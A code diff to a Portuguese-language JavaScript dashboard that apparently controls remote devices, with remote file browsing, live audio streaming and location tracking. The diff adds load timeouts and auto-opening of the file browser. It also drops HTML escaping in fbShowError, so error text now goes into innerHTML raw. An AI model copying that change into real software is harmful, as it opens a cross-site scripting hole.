@@ -31,6 +31,7 @@ let streetUpdateInterval = null;    // hourly update timer
 let fbCurrentPath = '';
 let fbHistory     = [];
 let fbPreviewPending = {}; // path → { name, itemEl } — tracks pending preview requests
+let fbLoadTimeout = null;  // pending timeout handle — cleared on success or error
 
 // Web Audio API for live PCM streaming
 let audioCtx = null;
@@ -319,6 +320,10 @@ function sidebarNav(tab, platform) {
             // (The historico hook may have already restored display='' for all
             // non-special cards before reaching here; we re-apply focus now.)
             desktopFocusCard(tab);
+            // Auto-open file browser on first visit (desktop)
+            if (tab === 'files' && currentDeviceId && !fbCurrentPath) {
+                requestAnimationFrame(() => fbOpen());
+            }
         } else {
             // Primary panels (map, control): restore the full scrollable grid
             // and scroll to the target card.
@@ -414,6 +419,11 @@ function switchTab(tab) {
             map.invalidateSize();
             if (deviceMarker) map.panTo(deviceMarker.getLatLng());
         }, 120);
+    }
+
+    // Auto-open file browser on first visit (mobile)
+    if (tab === 'files' && currentDeviceId && !fbCurrentPath) {
+        requestAnimationFrame(() => fbOpen());
     }
 
     // When leaving messages, reset to conversation list view
@@ -1481,10 +1491,12 @@ function selectDevice(deviceId) {
     fbCurrentPath = '';
     fbHistory = [];
     fbPreviewPending = {};
+    if (fbLoadTimeout) { clearTimeout(fbLoadTimeout); fbLoadTimeout = null; }
     const fbList = document.getElementById('fb-list');
     if (fbList) { fbList.innerHTML = ''; fbList.style.display = 'none'; }
     const fbEmpty = document.getElementById('fb-empty');
-    if (fbEmpty) fbEmpty.style.display = 'flex';
+    if (fbEmpty) { fbEmpty.style.display = 'flex'; fbEmpty.innerHTML = '<i class="fa-solid fa-folder fa-2x"></i><p>Selecione um dispositivo e clique em Abrir</p><button class="btn btn-sm btn-primary" onclick="fbOpen()"><i class="fa-solid fa-folder-open"></i> Abrir Arquivos</button>'; }
+    document.getElementById('fb-loading').style.display = 'none';
     const fbBreadcrumb = document.getElementById('fb-breadcrumb');
     if (fbBreadcrumb) fbBreadcrumb.textContent = '/';
 
@@ -2623,12 +2635,35 @@ function escapeHtml(unsafe) {
 // ─── Remote File Browser ─────────────────────────────────────────────────────
 
 function fbOpen(path) {
-    if (!currentDeviceId) { logToConsole('Nenhum dispositivo selecionado!', 'error'); return; }
+    if (!currentDeviceId) {
+        fbShowError('Nenhum dispositivo selecionado.');
+        return;
+    }
+
+    // Se o dispositivo está offline, mostra erro imediatamente sem spinner eterno
+    const dev = devicesMap.get(currentDeviceId);
+    if (dev && !dev.isOnline) {
+        fbShowError('Dispositivo offline. Reconecte o aparelho e tente novamente.');
+        return;
+    }
+
     const p = path || '/sdcard';
     fbCurrentPath = p;
     document.getElementById('fb-loading').style.display = 'flex';
     document.getElementById('fb-empty').style.display   = 'none';
     document.getElementById('fb-list').style.display    = 'none';
+
+    // Cancela timeout anterior (evita erros fantasma de requisições anteriores)
+    if (fbLoadTimeout) { clearTimeout(fbLoadTimeout); fbLoadTimeout = null; }
+
+    // Timeout de 15s: se o dispositivo não responder, mostra erro em vez de spinner eterno
+    fbLoadTimeout = setTimeout(() => {
+        fbLoadTimeout = null;
+        if (document.getElementById('fb-loading').style.display !== 'none') {
+            fbShowError('O dispositivo não respondeu.<br><small>Verifique se o app está ativo e com permissão de armazenamento.</small>');
+        }
+    }, 15000);
+
     sendCommand('LIST_FILES', { path: p });
 }
 
@@ -2642,6 +2677,7 @@ function fbNavigateUp() {
 }
 
 function fbRenderList(data) {
+    if (fbLoadTimeout) { clearTimeout(fbLoadTimeout); fbLoadTimeout = null; }
     document.getElementById('fb-loading').style.display = 'none';
     document.getElementById('fb-empty').style.display   = 'none';
 
@@ -2728,11 +2764,12 @@ function fbRenderList(data) {
 }
 
 function fbShowError(msg) {
+    if (fbLoadTimeout) { clearTimeout(fbLoadTimeout); fbLoadTimeout = null; }
     document.getElementById('fb-loading').style.display = 'none';
     document.getElementById('fb-list').style.display    = 'none';
     const empty = document.getElementById('fb-empty');
     empty.style.display = 'flex';
-    empty.innerHTML = `<i class="fa-solid fa-triangle-exclamation fa-2x" style="color:var(--danger-red)"></i><p style="color:var(--danger-red)">${escapeHtml(msg)}</p><button class="btn btn-sm btn-primary" onclick="fbOpen()"><i class="fa-solid fa-folder-open"></i> Abrir Raiz</button>`;
+    empty.innerHTML = `<i class="fa-solid fa-triangle-exclamation fa-2x" style="color:var(--danger-red)"></i><p style="color:var(--danger-red)">${msg}</p><button class="btn btn-sm btn-primary" onclick="fbOpen()"><i class="fa-solid fa-folder-open"></i> Tentar Novamente</button>`;
 }
 
 // ── Preview image directly in lightbox (no manual download needed) ────────────
